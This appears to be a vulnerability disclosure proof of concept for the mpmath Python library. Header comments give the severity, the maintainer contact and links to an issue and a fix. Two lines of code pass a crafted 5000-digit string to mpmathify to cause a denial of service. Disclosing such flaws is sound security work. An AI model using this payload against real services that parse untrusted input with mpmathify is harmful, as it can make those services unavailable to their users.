
#  mpmath
#  Link to published package: https://github.com/fredrik-johansson/mpmath
#  Link to GitHub repo: https://github.com/fredrik-johansson/mpmath
#  description: Python library for arbitrary-precision floating-point arithmetic
#  Severity level: High
#  Additional Info: It allows cause a denial of service when calling the mpmathify function.
#  Contacted maintainer?: Yes
#  Open issue?: Yes
#  https://github.com/fredrik-johansson/mpmath/issues/548
#  https://github.com/vks/mpmath/commit/c811b37c65a4372a7ce613111d2a508c204f9833

from  mpmath import mpmathify
mpmathify("(" + "1" * 5000 + "j!")
